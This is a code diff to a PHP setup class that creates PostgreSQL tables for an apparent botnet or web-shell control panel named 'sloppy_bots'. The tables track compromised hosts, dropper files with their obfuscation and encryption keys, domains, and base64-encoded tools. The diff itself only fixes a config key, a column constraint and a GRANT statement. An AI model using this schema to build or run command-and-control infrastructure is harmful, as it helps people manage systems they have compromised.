@@ -15,7 +15,7 @@ class postgres_checker
     function createDB()
     {
         $sloppy_ini = parse_ini_file(getcwd() . "/includes/config/sloppy_config.ini", true);
-        if (empty($sloppy_ini['sloppy_bot_user']['pass'])) {
+        if (empty($sloppy_ini['sloppy_db']['pass'])) {
             try {
                 $outWrite = file(getcwd() . "/includes/config/sloppy_config.ini");
                 $tt = fopen(getcwd() . '/includes/config/sloppy_config.ini', "w");
@@ -31,9 +31,9 @@ class postgres_checker
                 pg_exec($this->init_conn(), "CREATE TABLE IF NOT EXISTS sloppy_bots_main(id SERIAL NOT NULL constraint sloppy_bots_main_pkey primary key,datetime TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL, rhost TEXT UNIQUE NOT NULL, uri TEXT NOT NULL, os_flavor TEXT NOT NULL DEFAULT '-', check_in INTEGER NOT NULL default 0, uuid TEXT NOT NULL DEFAULT '-')");
                 pg_exec($this->init_conn(), "CREATE TABLE IF NOT EXISTS sloppy_bots_droppers(id SERIAL NOT NULL constraint sloppy_bots_droppers_pkey primary key,datetime TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL, location_on_disk TEXT NOT NULL UNIQUE, depth TEXT NOT NULL, obfuscated TEXT NOT NULL default 'false', check_in INTEGER NOT NULL default 0, chachakey TEXT UNIQUE NOT NULL DEFAULT '-', aeskeys TEXT UNIQUE NOT NULL DEFAULT '-', xorkey TEXT NOT NULL UNIQUE DEFAULT '-')");
                 pg_exec($this->init_conn(), "CREATE TABLE IF NOT EXISTS sloppy_bots_domains(id SERIAL NOT NULL constraint sloppy_bots_domains_pkey primary key,datetime TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL, uses INTEGER NOT NULL DEFAULT 0, domain TEXT UNIQUE NOT NULL DEFAULT '-')");
-                pg_exec($this->init_conn(), "CREATE TABLE IF NOT EXISTS sloppy_bots_tools(id SERIAL NOT NULL constraint sloppy_bots_tools_pkey primary key,datetime TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL, tool_name TEXT UNIQUE NOT NULL DEFAULT '-', target TEXT NOT NULL DEFAULT '-', base64_encoded_tool TEXT UNIQUE NOT NULL DEFAULT '-', keys TEXT UNIQUE DEFAULT '-', tags TEXT UNIQUE DEFAULT '-', iv TEXT UNIQUE DEFAULT '-', aad TEXT UNIQUE DEFAULT '-',cipher TEXT DEFAULT '-', hmac_hash TEXT UNIQUE DEFAULT '-', lang TEXT DEFAULT '-', encrypted BOOLEAN DEFAULT false)");
+                pg_exec($this->init_conn(), "CREATE TABLE IF NOT EXISTS sloppy_bots_tools(id SERIAL NOT NULL constraint sloppy_bots_tools_pkey primary key,datetime TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP NOT NULL, tool_name TEXT UNIQUE NOT NULL DEFAULT '-', target TEXT NOT NULL DEFAULT '-', base64_encoded_tool TEXT UNIQUE NOT NULL DEFAULT '-', keys TEXT UNIQUE DEFAULT '-', tags TEXT UNIQUE DEFAULT '-', iv TEXT UNIQUE DEFAULT '-', aad TEXT DEFAULT '-',cipher TEXT DEFAULT '-', hmac_hash TEXT UNIQUE DEFAULT '-', lang TEXT DEFAULT '-', encrypted BOOLEAN DEFAULT false)");
                 pg_exec($this->init_conn(), "GRANT SELECT,INSERT,UPDATE ON sloppy_bots_main,sloppy_bots_droppers,sloppy_bots_domains,sloppy_bots_tools TO sloppy_bot");
-                pg_exec($this->init_conn(), "GRANT ALL PRIVILEGES ON ALL SEQUENCES IN sloppy_bots_main,sloppy_bots_droppers,sloppy_bots_domains,sloppy_bots_tools TO sloppy_bot");
+                pg_exec($this->init_conn(), "GRANT ALL ON ALL SEQUENCES IN SCHEMA public TO sloppy_bot");
                 // calling this commit to ensure the transaction succeeds, even though we have set autocommit to on.
                 pg_exec($this->init_conn(), "COMMIT");
             } catch (Exception $ex) {
